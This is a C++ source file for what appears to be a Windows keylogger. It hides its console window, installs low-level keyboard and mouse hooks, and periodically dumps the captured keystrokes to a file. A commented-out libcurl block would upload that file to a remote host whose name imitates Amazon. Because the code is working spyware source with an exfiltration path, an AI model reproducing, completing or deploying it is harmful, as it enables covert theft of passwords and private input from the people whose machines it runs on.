#include "WindowsHook.h"
#include "include/curl/curl.h"

const std::chrono::seconds waitTime = std::chrono::seconds(int(/* => minutes */ 90)); // seconds -> 15 minutes

// thread function
void timeCheck() {
	std::string tmp;
	while (true) {
		// Wait 15 minutes
		std::this_thread::sleep_for(waitTime);
		tmp = contentFile;
		contentFile = "";
		std::ofstream outputFile(FilePath);
		if (outputFile.is_open()) outputFile << tmp;
		outputFile.close();

		//// sending the file to the server
		//CURL* curl;
		//CURLcode res;
		//curl_global_init(CURL_GLOBAL_ALL);
		//curl = curl_easy_init();

		//if (curl) {
		//	curl_easy_setopt(curl, CURLOPT_URL, "https://amazontheveryreal.000webhostapp.com/home.php");
		//	curl_mime* mime;
		//	curl_mimepart* part;
		//	mime = curl_mime_init(curl);
		//	part = curl_mime_addpart(mime);
		//	curl_mime_name(part, "file");
		//	curl_mime_filedata(part, FilePath.c_str());
		//	curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
		//	res = curl_easy_perform(curl);
		//	curl_easy_cleanup(curl);
		//	curl_mime_free(mime);
		//}
		//curl_global_cleanup();

		// here I check if meanwhile that I have sent the mail, the user has typed some more keys
		(contentFile != "") ? (tmp = StartString() + contentFile, contentFile = tmp) : (contentFile = StartString());
	}
}

// main function
int main()
{
	std::thread t(timeCheck); // istancing a thread

	FreeConsole();

	WindowsHook mouseHook = WindowsHook();
	mouseHook.SetHook(WH_MOUSE_LL);

	WindowsHook keyboardHook = WindowsHook();
	keyboardHook.SetHook(WH_KEYBOARD_LL);

	MSG msg;
	while (GetMessage(&msg, nullptr, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	mouseHook.UnHook();
	keyboardHook.UnHook();

	return ERROR_SUCCESS;
}
